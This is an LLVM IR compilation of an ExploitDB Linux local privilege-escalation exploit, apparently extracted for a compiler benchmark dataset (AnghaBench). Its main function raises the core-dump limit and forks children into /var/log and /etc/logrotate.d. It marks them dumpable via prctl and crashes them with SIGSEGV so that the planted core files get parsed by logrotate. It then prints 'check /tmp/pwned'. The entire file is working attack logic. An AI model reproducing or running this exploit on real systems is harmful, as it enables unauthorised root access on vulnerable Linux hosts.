; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2031.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2031.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.rlimit = type { i8*, i8* }
%struct.stat = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"%s\0A%s\0A\0A\00", align 1
@INFO1 = common dso_local global i8* null, align 8
@INFO2 = common dso_local global i8* null, align 8
@pwnage = common dso_local global i32 0, align 4
@RLIM_INFINITY = common dso_local global i8* null, align 8
@RLIMIT_CORE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"/var/log\00", align 1
@PR_SET_DUMPABLE = common dso_local global i32 0, align 4
@SIGSEGV = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"/etc/logrotate.d\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"/var/log/core\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"/etc/logrotate.d/core\00", align 1
@.str.5 = private unnamed_addr constant [38 x i8] c"Error: Not vulnerable? See comments.\0A\00", align 1
@.str.6 = private unnamed_addr constant [59 x i8] c"Please wait until logrotate is run and check /tmp/pwned;)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.rlimit, align 8
  %4 = alloca %struct.stat, align 4
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @stderr, align 4
  %6 = load i8*, i8** @INFO1, align 8
  %7 = load i8*, i8** @INFO2, align 8
  %8 = call i32 (i32, i8*, ...) @fprintf(i32 %5, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %6, i8* %7)
  %9 = load i32, i32* @pwnage, align 4
  %10 = call i32 @system(i32 %9)
  %11 = load i8*, i8** @RLIM_INFINITY, align 8
  %12 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %3, i32 0, i32 1
  store i8* %11, i8** %12, align 8
  %13 = load i8*, i8** @RLIM_INFINITY, align 8
  %14 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %3, i32 0, i32 0
  store i8* %13, i8** %14, align 8
  %15 = load i32, i32* @RLIMIT_CORE, align 4
  %16 = call i32 @setrlimit(i32 %15, %struct.rlimit* %3)
  %17 = call i32 (...) @fork()
  store i32 %17, i32* %2, align 4
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %25, label %19

19:                                               ; preds = %0
  %20 = call i32 @chdir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %21 = load i32, i32* @PR_SET_DUMPABLE, align 4
  %22 = call i32 @prctl(i32 %21, i32 2)
  %23 = call i32 @sleep(i32 666)
  %24 = call i32 @exit(i32 1) #3
  unreachable

25:                                               ; preds = %0
  %26 = load i32, i32* %2, align 4
  %27 = load i32, i32* @SIGSEGV, align 4
  %28 = call i32 @kill(i32 %26, i32 %27)
  %29 = call i32 (...) @fork()
  store i32 %29, i32* %2, align 4
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %37, label %31

31:                                               ; preds = %25
  %32 = call i32 @chdir(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  %33 = load i32, i32* @PR_SET_DUMPABLE, align 4
  %34 = call i32 @prctl(i32 %33, i32 2)
  %35 = call i32 @sleep(i32 666)
  %36 = call i32 @exit(i32 1) #3
  unreachable

37:                                               ; preds = %25
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* @SIGSEGV, align 4
  %40 = call i32 @kill(i32 %38, i32 %39)
  %41 = call i32 @sleep(i32 3)
  %42 = call i64 @stat(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0), %struct.stat* %4)
  %43 = icmp slt i64 %42, 0
  br i1 %43, label %47, label %44

44:                                               ; preds = %37
  %45 = call i64 @stat(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), %struct.stat* %4)
  %46 = icmp slt i64 %45, 0
  br i1 %46, label %47, label %51

47:                                               ; preds = %44, %37
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  %50 = call i32 @exit(i32 1) #3
  unreachable

51:                                               ; preds = %44
  %52 = load i32, i32* @stderr, align 4
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %52, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.6, i64 0, i64 0))
  %54 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @system(i32) #1

declare dso_local i32 @setrlimit(i32, %struct.rlimit*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @prctl(i32, i32) #1

declare dso_local i32 @sleep(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
